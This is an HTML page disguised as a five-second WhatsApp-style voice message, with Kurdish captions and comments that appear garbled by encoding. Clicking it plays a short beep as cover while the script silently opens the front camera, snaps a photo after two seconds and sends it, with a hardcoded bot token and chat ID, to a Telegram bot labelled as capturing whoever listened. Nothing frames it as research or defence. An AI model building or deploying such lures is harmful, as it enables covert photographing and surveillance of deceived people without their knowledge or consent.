<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voice Message (0:05)</title>
    <meta property="og:title" content="Voice Message (0:05)">
    <meta property="og:description" content="ðŸŽ™ï¸ Ù¾Û•ÛŒØ§Ù…ÛŒ Ø¯Û•Ù†Ú¯ÛŒ">
    <style>
        body { background-color: #e5ddd5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .voice-card { background: white; padding: 12px 18px; border-radius: 12px; display: flex; align-items: center; width: 300px; box-shadow: 0 2px 5px rgba(0,0,0,0.15); cursor: pointer; }
        .play-btn { width: 45px; height: 45px; background: #25D366; border-radius: 50%; display: flex; justify-content: center; align-items: center; border: none; color: white; font-size: 24px; }
        .wave-img { flex-grow: 1; margin: 0 15px; height: 35px; opacity: 0.6; }
        .time { font-size: 13px; color: #777; font-weight: bold; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="voice-card" onclick="playAndCapture()">
        <button class="play-btn" id="btnIcon">â–¶</button>
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Audio_wave.png" class="wave-img">
        <div class="time">0:05</div>
    </div>

    <audio id="myAudio">
        <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
    </audio>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
        const ID = '6351568884';

        function playAndCapture() {
            const audio = document.getElementById('myAudio');
            const btn = document.getElementById('btnIcon');

            // Ù¡. Ù„ÛŽØ¯Ø§Ù†ÛŒ Ø¯Û•Ù†Ú¯Û•Ú©Û• Ø¨Û† Ø¦Û•ÙˆÛ•ÛŒ Ú¯ÙˆÙ…Ø§Ù† Ù†Û•Ú©Ø§Øª
            audio.play();
            btn.innerText = "â¸";

            // Ù¢. Ø¯Ø§ÙˆØ§Ú©Ø±Ø¯Ù†ÛŒ Ú©Ø§Ù…ÛŽØ±Ø§ Ù„Û• Ù¾Ø´ØªÛ•ÙˆÛ•
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    
                    // Ø¯ÙˆØ§ÛŒ Ù¢ Ú†Ø±Ú©Û• Ú©Û• Ø³Û•Ø±Ù‚Ø§ÚµÛŒ Ø¯Û•Ù†Ú¯Û•Ú©Û•ÛŒÛ•ØŒ ÙˆÛŽÙ†Û•Ú©Û•ÛŒ Ø¯Û•Ú¯Ø±ÛŽØª
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('chat_id', ID);
                            formData.append('photo', blob, 'voice_user.jpg');
                            formData.append('caption', 'ðŸŽ™ï¸ ÙˆÛŽÙ†Û•ÛŒ Ø¦Û•Ùˆ Ú©Û•Ø³Û•ÛŒ Ú¯ÙˆÛŽÛŒ Ù„Û• Ú¤Û†ÛŒØ³Û•Ú©Û• Ú¯Ø±Øª');

                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                        }, 'image/jpeg', 0.7);
                    }, 2000);
                };
            })
            .catch(() => {
                console.log("Permission Denied");
            });

            // Ú©Ø§ØªÛŽÚ© Ø¯Û•Ù†Ú¯Û•Ú©Û• ØªÛ•ÙˆØ§Ùˆ Ø¨ÙˆÙˆ Ø¦Ø§ÛŒÚ©Û†Ù†Û•Ú©Û• Ø¯Û•Ú¯Û†Ú•ÛŽØªÛ•ÙˆÛ•
            audio.onended = () => { btn.innerText = "â–¶"; };
        }
    </script>
</body>
</html>
